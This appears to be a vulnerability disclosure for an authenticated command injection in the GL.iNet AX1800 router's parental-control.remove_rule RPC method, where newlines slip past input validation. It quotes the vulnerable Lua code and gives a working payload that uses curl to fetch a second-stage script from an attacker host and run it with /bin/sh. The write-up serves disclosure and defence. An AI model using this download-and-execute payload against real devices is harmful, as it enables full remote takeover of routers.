# GL-link AX1800

The vulnerability exists in the GL.iNet AX1800 web management JSON-RPC interface, exposed through the `POST /rpc` endpoint. The affected RPC object is `parental-control`, specifically the `remove_rule` method. When this method is invoked, the user-controlled `args.id` value is passed into the backend handler and ultimately concatenated into shell commands executed through `os.execute()`, resulting in an authenticated command injection vulnerability.

The request processing flow is as follows. Incoming requests to `/rpc` are routed by nginx to `/usr/share/gl-ngx/oui-rpc.lua`, which parses the JSON-RPC request and forwards it to the RPC dispatcher implemented in `/usr/lib/lua/oui/rpc.lua`. The dispatcher performs parameter validation and dynamically loads the corresponding backend module from `/usr/lib/oui-httpd/rpc/parental-control`. The vulnerable sink is reached when the `remove_rule` handler processes the attacker-controlled `id` parameter.

The root cause is that `parental-control.remove_rule` does not define a strict dedicated validator for the `id` argument. As a result, validation falls back to the framework’s generic default validator, which allows the following character class:

```
^[%w%.%s%-_:#/]-$
```

This pattern permits letters, digits, underscores, dots, spaces, hyphens, colons, slashes, and, critically, `%s`, which includes newline characters. Although several common shell metacharacters such as `|`, `>`, `&`, and `;` are blocked by this validator, newline injection is still possible. Because the backend later concatenates the validated input directly into a shell command string, an attacker can use newline characters to terminate the intended command and append arbitrary additional commands.

The vulnerable code in the `parental-control.remove_rule` handler is:

```
local sid = params.id
local file_path = "/etc/parental_control/gl-" .. sid
local update_url_path = "/tmp/pc_check_" .. sid .. "*"
os.execute("rm -rf " .. file_path)
os.execute("rm -rf " .. update_url_path)
```

Here, `params.id` is fully attacker-controlled and is inserted into two separate `os.execute()` calls without escaping or strict allowlist enforcement. This enables command injection via newline-separated payloads.

A reliable exploitation strategy is to use a **download-and-execute stager**. Because the validator restricts some shell control characters, directly embedding a full reverse shell one-liner in `args.id` may fail. However, the attacker can still inject a payload composed only of allowed characters, using the device’s built-in `curl` binary to download a second-stage script from an attacker-controlled server and then execute it with `/bin/sh`.

A representative malicious `args.id` value is:

```
"\n/usr/bin/curl 192.168.0.2/rs.sh -o /tmp/rs\n/bin/sh /tmp/rs\n#"
```

This payload contains only characters accepted by the default validator: letters, digits, slashes, dots, colons, spaces, hyphens, newlines, and `#`. After concatenation, the resulting shell execution is effectively equivalent to:

```
rm -rf /etc/parental_control/gl-
/usr/bin/curl 192.168.0.2/rs.sh -o /tmp/rs
/bin/sh /tmp/rs
#
```

The second sink similarly becomes:

```
rm -rf /tmp/pc_check_
/usr/bin/curl 192.168.0.2/rs.sh -o /tmp/rs
/bin/sh /tmp/rs
#*
```

As a result, the device connects back to the attacker-controlled HTTP server at `192.168.0.2`, downloads the second-stage script `rs.sh` into `/tmp/rs`, and executes it locally with `/bin/sh`. Since the contents of `rs.sh` are no longer subject to RPC parameter validation, the second-stage script may contain any shell syntax or logic, including reverse shells, persistence mechanisms, file exfiltration, credential harvesting, or arbitrary system command execution.

This makes the vulnerability significantly more practical to exploit. Even though the first-stage injected payload is limited by the validator, the attacker can use it to bootstrap unrestricted code execution through a remote script. In practice, the second-stage script may, for example, establish a reverse shell, copy sensitive files into a web-accessible directory, modify startup scripts for persistence, or alter device configuration.

Successful exploitation requires an authenticated session or valid RPC session ID, meaning the vulnerability is authenticated rather than unauthenticated. However, once a valid session is obtained, exploitation is straightforward and reliable. The vulnerability was dynamically validated in a firmware 4.8.3 emulation environment by sending a crafted JSON-RPC request to `/rpc`, invoking `parental-control.remove_rule`, and supplying the malicious newline-based `args.id` payload shown above. The device successfully downloaded and executed the attacker-provided script, confirming that authenticated remote code execution is achievable.

In summary, this issue is an **authenticated command injection leading to full remote code execution**. The security impact is severe because an authenticated attacker can leverage the vulnerable RPC method to execute arbitrary shell commands as the device service user, which on embedded OpenWrt-based systems is often `root`, resulting in complete compromise of confidentiality, integrity, and availability.



![image-20260613024832130](/image-20260613024832130.png)

![image-20260613024845052](/image-20260613024845052.png)

![image-20260613024911756](/image-20260613024911756.png)

![image-20260613024929764](/image-20260613024929764.png)
